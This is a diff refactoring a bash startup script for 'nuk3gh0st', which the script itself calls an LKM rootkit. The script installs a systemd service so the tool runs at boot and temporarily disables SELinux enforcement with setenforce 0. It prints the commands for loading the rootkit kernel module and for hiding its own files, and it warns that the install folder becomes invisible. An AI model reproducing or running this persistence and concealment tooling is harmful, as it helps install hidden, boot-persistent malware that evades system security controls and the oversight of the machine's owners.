@@ -8,67 +8,36 @@ cyan='\e[0;36m'
 endColor='\e[0m'
 item=${green}[*]${endColor}
 
-echo ""
-echo -e "${green}#################################${endColor}"
-echo -e "${green}# Enabling nuk3gh0st at startup #${endColor}"
-echo -e "${green}#################################${endColor}"
-echo ""
+function print_banner {
+	echo ""
+	echo -e "${green}#################################${endColor}"
+	echo -e "${green}# Enabling nuk3gh0st at startup #${endColor}"
+	echo -e "${green}#################################${endColor}"
+	echo ""
+}
 
-echo -e "${item} Coping nuk3gh0st.service to systemd startup scripts directory"
-echo -e "   ${purple} cmd: cp /usr/share/nuk3gh0st/nuk3gh0st.service /lib/systemd/system/nuk3gh0st.service${endColor}"
-echo ""
+function create_systemd_service {
+	echo -e "${item} Coping nuk3gh0st.service to systemd startup scripts directory"
+	echo -e "   ${purple} cmd: cp /usr/share/nuk3gh0st/nuk3gh0st.service /lib/systemd/system/nuk3gh0st.service${endColor}"
+	cp /usr/share/nuk3gh0st/nuk3gh0st.service /lib/systemd/system/nuk3gh0st.service
+	echo ""
+}
 
-cp /usr/share/nuk3gh0st/nuk3gh0st.service /lib/systemd/system/nuk3gh0st.service
-echo -e "${item} Checking if SELINUX is enabled"
-if [ -f /usr/sbin/semanage ]; then
-	echo -e "${item} SELINUX is enabled"
-	#semanage permissive -a insmod_t
-	echo -e "${item} Disabling SELINUX temporarily"
-	echo -e "   ${purple} cmd: setenforce 0${endColor}"
-	setenforce 0
-	echo ""
-	
-	echo -e "${item} Enabling nuk3gh0st.service"
-	echo -e "   ${purple} cmd: systemctl enable nuk3gh0st.service${endColor}"
-	echo -n -e "${cyan}"
-	systemctl enable nuk3gh0st.service
-	echo -n -e "${endColor}"
-	echo ""
-	
-	echo -e "${item} Starting nuk3gh0st.service"
-	echo -e "   ${purple} cmd: service nuk3gh0st start${endColor}"
-	echo -n -e "${cyan}"
-	service nuk3gh0st start
-	echo -n -e "${endColor}"
-	echo ""
-	
-	echo -e "${item} Loading nuk3gh0st LKM rootkit"
-	echo -e "   ${purple} cmd: insmod /usr/lib/rootkit.ko${endColor}"
-	echo ""
-	
-	echo -e "${item} Hidding nuk3gh0st files"
-	echo -e "   ${purple} cmd: nuk3gh0st --hide-file=rootkit.ko${endColor}"
-	echo -e "   ${purple} cmd: nuk3gh0st --hide-file=nuk3gh0st${endColor}"
-	echo -e "   ${purple} cmd: nuk3gh0st --hide-file=load-nuk3gh0st${endColor}"
-	echo -e "   ${purple} cmd: nuk3gh0st --hide-file=unload-nuk3gh0st${endColor}"
-	echo -e "   ${purple} cmd: nuk3gh0st --hide-file=startup-nuk3gh0st${endColor}"
-	echo -e "   ${purple} cmd: nuk3gh0st --hide-file=rmstartup-nuk3gh0st${endColor}"
-	echo -e "   ${purple} cmd: nuk3gh0st --hide-file=nuk3gh0st.startup${endColor}"
-	echo -e "   ${purple} cmd: nuk3gh0st --hide-file=nuk3gh0st.service${endColor}"
-	echo ""
-	
-	echo -e "${yellow}WARNING: you won't be able to see the installation folder"
-	echo -e "until you unload the rootkit, but it will still exist "
-	echo -e "and you can access to it if you remember the path${endColor}"
-	echo ""
-	
+function enable_selinux {
 	echo -e "${item} Reenabling SELINUX"
 	echo -e "   ${purple} cmd: setenforce 1${endColor}"
 	setenforce 1
         echo ""
-	
-else
-	echo -e "${item} SELINUX is disabled"
+}
+
+function disable_selinux {
+	echo -e "${item} Disabling SELINUX temporarily"
+	echo -e "   ${purple} cmd: setenforce 0${endColor}"
+	setenforce 0
+	echo ""
+}
+
+function enable_startup_service {
 	echo -e "${item} Enabling nuk3gh0st.service"
 	echo -e "   ${purple} cmd: systemctl enable nuk3gh0st.service${endColor}"
 	echo -n -e "${cyan}"
@@ -82,11 +51,15 @@ else
 	service nuk3gh0st start
 	echo -n -e "${endColor}"
 	echo ""
-	
+}
+
+function load_rootkit {
 	echo -e "${item} Loading nuk3gh0st LKM rootkit"
 	echo -e "   ${purple} cmd: insmod /usr/lib/rootkit.ko${endColor}"
 	echo ""
-	
+}
+
+function hide_rootkit_files {
 	echo -e "${item} Hidding nuk3gh0st files"
 	echo -e "   ${purple} cmd: nuk3gh0st --hide-file=rootkit.ko${endColor}"
 	echo -e "   ${purple} cmd: nuk3gh0st --hide-file=nuk3gh0st${endColor}"
@@ -97,8 +70,27 @@ else
 	echo -e "   ${purple} cmd: nuk3gh0st --hide-file=nuk3gh0st.startup${endColor}"
 	echo -e "   ${purple} cmd: nuk3gh0st --hide-file=nuk3gh0st.service${endColor}"
 	echo ""
+	
 	echo -e "${yellow}WARNING: you won't be able to see the installation folder"
 	echo -e "until you unload the rootkit, but it will still exist "
 	echo -e "and you can access to it if you remember the path${endColor}"
 	echo ""
+}
+
+print_banner
+create_systemd_service
+echo -e "${item} Checking if SELINUX is enabled"
+if [ -f /usr/sbin/semanage ]; then
+	echo -e "${item} SELINUX is enabled"
+	#semanage permissive -a insmod_t
+	disable_selinux
+	enable_startup_service	
+	load_rootkit	
+	hide_rootkit_files	
+	enable_selinux
+else
+	echo -e "${item} SELINUX is disabled"
+	enable_startup_service
+	load_rootkit
+	hide_rootkit_files
 fi
